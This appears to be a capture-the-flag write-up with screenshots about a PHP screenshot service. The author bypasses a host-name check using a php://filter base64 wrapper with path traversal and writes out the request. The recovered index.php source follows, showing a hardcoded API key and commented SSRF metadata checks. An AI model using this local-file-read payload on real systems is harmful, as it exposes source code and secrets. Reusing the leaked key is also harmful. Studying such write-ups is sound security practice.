![image](https://user-images.githubusercontent.com/67979878/128135525-c48bacba-e62c-47ca-b5ec-fb36bc5165a9.png)
it looks like it takes a screenshot and display it .
![image](https://user-images.githubusercontent.com/67979878/128136423-73a60cac-06ec-46f8-a4f9-4d1dbf05d7bf.png)

as we can see the web app uses a vulnerable php function 
![image](https://user-images.githubusercontent.com/67979878/128136447-5695e840-bca1-4237-8164-30641cb69941.png)


link: http://ec2-54-184-225-39.us-west-2.compute.amazonaws.com/screenshot/?url=11111111111111111111111&server=http%3A%2F%2Finternalapi1.local%2F

as we can notice to have previous response browser sent 2 parameters url,server 

there is an image return each time in the view source page we can download it and see results .

after serveral trials i find out that :

- it makes sure server conatin internalapi.localx or returns not valid url  
- if doesn't exist will have an empty image

payload :

i used a php wrapper as a payload to view /index.php .
in url sending parameters :

?url=&server=php://filter/convert.base64-encode/resource=internalapi3.local/../index.php

now we have a valid image ! , i downloaded it as .txt beacuse i know it is a php base64 encoded 

decoding it and removing non interesting parts of it .
```
<?php

if(isset($_GET['url'])){
    //--- Set the parameters --------------//
    $url  = $_GET['server'].$_GET['url'];
    $apikey = "ab6e7c527efda467019ba2687739c74c089fe5cd9c2a";
    $file = __DIR__.'/thumbs/'.md5($url).'.jpg';
    $fileURL = 'thumbs/'.md5($url).'.jpg';
    $width  = 640;
    $fetchUrl = "https://api.thumbnail.ws/api/".$apikey ."/thumbnail/get?url=".urlencode($url)."&width=".$width;
    $fakeUrl = $url;

    if(filter_var($url, FILTER_VALIDATE_URL)) {
        $r = parse_url($url);
        //print_r($r);

        if(!preg_match('/internalapi[1-9]\.local/', $url)) {
            echo 'Invalid HOST:-'.'<br />';
            echo 'You must choose one of our internal apis internalapi [1:9] only'.'<br />';
            echo 'Given: '.htmlentities($url);
            exit;
        }

    // if(strstr($url,'@')){   //if url contain @

    //     $info = explode('@',$url);
    //     $url = $info[1];

    //     $serverIP = '54.187.57.106';
    //     $supposeURL = '54.187.57.106/latest/meta-data/hostname';
    //     $supposeURL2 = '127.0.0.1/latest/meta-data/hostname';

    //     if(strstr($url,$supposeURL) || strstr($url,$supposeURL2))
    //      {
    //         $jpeg =  'Server!Host@Flag';
    //         file_put_contents($file, $jpeg);
            }
    ?>


```


you can see ` $jpeg =  'Server!

@Flag';`



